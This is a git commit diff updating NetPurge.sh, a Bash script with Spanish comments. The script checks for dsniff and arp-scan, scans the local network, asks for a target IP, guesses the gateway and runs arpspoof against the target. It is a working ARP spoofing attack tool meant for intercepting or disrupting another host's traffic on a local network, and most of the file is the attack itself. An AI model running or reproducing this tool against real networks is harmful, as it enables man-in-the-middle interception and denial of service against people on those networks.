7da36dea496449550bb2342c2c13f55ecdde5901
arbolencio <85744933+Arbolencio@users.noreply.github.com>
2024-02-23 22:48:34 +0100

    Update NetPurge.sh

--- NetPurge.sh
+++ NetPurge.sh
@@ -1,4 +1,19 @@
-#!/bin/bash
+#!/bin/bash 
+
+# ver si las herramintas estan disponibles 
+
+check_herramientas() {
+    if ! [ -x "$(command -v $1)" ]; then
+        echo -e "\033[1;31m Error: $1 is not installed. Please install $1 and try again. \033[0m" >&2
+        exit 1
+    fi
+}
+
+check_herramientas "dsniff"
+check_herramientas "arp-scan"
+check_herramientas "netdiscover"
+
+#banner
 
 echo -e "\033[1;35m    _______  _______  ______   _______  _        _______  _        _______ _________ _______ "
 echo "   (  ___  )(  ____ )(  ___ \ (  ___  )( \      (  ____ \( (    /|(  ____ \\\__   __/(  ___  )"
@@ -18,28 +33,19 @@ echo "                     '--- ---'          '---'  v1.1  "
       echo -e "\033[1;32m "
       cat  dibujo.txt
       echo -e " \033[0m"
-check_herramienta() {
-    if ! [ -x "$(command -v $1)" ]; then
-       echo -e "\033[1;31m Error: $1 is not installed. Please install $1 and try again.\033[0m" >&2
-       exit 1
 
-    fi
-}
-
-check_herramienta "dsniff"
-check_herramienta "arp-scan"
-
+#ver ips de la interfaz
 echo -e "\033[0;33m"
 read -p "Show interface ip: " red
 ips=$(arp-scan -I "$red" --localnet | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}')
 
+#atacar la ip
 echo -e "\033[1;33m $ips"
 echo -e "\033[1;36m "
 read -p "the network you want to analyze: " interfaz
 echo -e "\033[1;35m "
-read -p "the target's ip:: " ip
+read -p "the target's ip: " ip
 puerta_enlace=$(echo $ip | sed 's/\([0-9]\+\)$/1/g')
 
+#comando 
 arpspoof -i "$interfaz" -t "$ip" "$puerta_enlace"
-
-
